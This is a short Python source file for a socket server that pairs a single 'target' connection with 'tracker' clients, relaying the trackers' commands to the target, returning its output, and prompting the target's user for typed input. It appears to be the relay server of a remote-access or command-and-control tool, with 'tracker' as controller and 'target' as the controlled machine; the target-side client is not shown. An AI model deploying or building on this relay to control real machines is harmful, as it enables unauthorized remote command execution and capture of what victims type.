import socket
import threading

def handle_tracker(conn, addr, target_conn):
    print(f"Tracker {addr} is connected to server")
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            target_conn.send('exit'.encode())
            break
        if command.lower() == 'input':
            prompt = conn.recv(1024).decode()
            target_conn.send('input'.encode())
            target_conn.send(prompt.encode())
            user_input = target_conn.recv(1024).decode()
            conn.send(user_input.encode())
        else:
            target_conn.send(command.encode())
            output = target_conn.recv(1024).decode()
            conn.send(output.encode())
    conn.close()

def handle_target(conn, addr):
    print(f"Target {addr} is connected to server")
    return conn

def main():
    s = socket.socket()
    host = socket.gethostname()
    port = 8080
    s.bind(('', port))
    s.listen(5)
    print("Server is listening...")

    target_conn = None

    while True:
        conn, addr = s.accept()
        role = conn.recv(1024).decode().strip().lower()
        if role == 'target' and target_conn is None:
            target_conn = handle_target(conn, addr)
        elif role == 'tracker' and target_conn is not None:
            threading.Thread(target=handle_tracker, args=(conn, addr, target_conn)).start()
        else:
            conn.close()
            print(f"Connection from {addr} closed due to invalid role or target already connected.")

if __name__ == "__main__":
    main()